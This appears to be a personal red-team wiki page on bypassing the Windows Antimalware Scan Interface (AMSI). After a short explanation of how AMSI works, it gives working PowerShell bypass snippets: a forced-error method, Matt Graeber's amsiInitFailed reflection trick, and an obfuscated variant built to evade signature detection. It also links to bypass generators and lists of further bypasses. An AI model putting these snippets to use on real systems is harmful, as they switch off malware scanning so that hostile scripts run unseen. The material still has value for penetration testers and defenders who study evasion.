# AMSI Bypassing

## Introduction

For basic information about [[ASMI]], but for actual [[AMSI-Exploitation]] contains a list of code snippets to exploit this article will be here just as a hub and overview of techniques - possibly restructure in the future. Anti-Malware Scan Interface is a general scripting language security feature that will allow any applications or services to integrate into antimalware products. It scan payloads and script before execution inside of the runtime.

The AMSI feature is integrated into these components of Windows 10.

-   User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
-   PowerShell (scripts, interactive use, and dynamic code evaluation)
-   Windows Script Host (wscript.exe and cscript.exe)
-   JavaScript and VBScript
-   Office VBA macros

AMSI Architecture
![](amsi7archi.jpg)

AMSI is instrumented in both System.Management.Automation.dll and within the CLR itself. When inside the CLR, it is assumed that Defender is already being instrumented; this means AMSI will only be called when loaded from memory.

Bypassing 

Test with: 
[amsi.fail](https://amsi.fail/) *"AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures."*



## Bypasses

One enumeration method for bypassing is compare target versions to bypass with [InsecurePowershell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master), which is a GitHub repository of PowerShell with security features removed. [S3cur3Th1sSh1t's currated List](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  is represented here with either code or  local links to big code blocks or Cheatsheats with function calls from the framework.

[[Nishang-Helpsheet]] - `Invoke-Amsibypass` will use  publicly known methods to bypass/avoid AMSI.


#### Patching asmi.dll

The bypasses that will identify DLL locations and modify memory permissions to return undetected AMSI response values.

Patching the  asmi.dll - [[AMSI-ScanBuffer-Patch]] - Egghunter with blog post: [https://www.contextis.com/us/blog/amsi-bypass](https://www.contextis.com/us/blog/amsi-bypass)

ScanBuffer patch - [[AMSI-Buffer-Patch-In-memory]]
ScanBuffer bypass - [Rasta-Mouse](https://github.com/rasta-mouse/AmsiScanBufferBypass)

#### Forcing errors

Force an error
```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

#### Graeber Reflection
[Matt Graeber's Reflection](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) utilizes Powershell to set the response value of ASMI to  `$null`

Matt Graebers Reflection method
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Matt Graebers Reflection method with WMF5 autologging bypass
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

Matt Graebers second Reflection method
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```


#### PowerShell downgrading





## References


[pentestlaboratories article](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
[AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[Documentation AMSI](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[Documentation - How AMSI Helps](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
[ASMI Result Documentation](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
[AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[InsecurePowershell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master)
[S3cur3Th1sSh1t's currated List](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
[Matt Graeber's Reflection](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)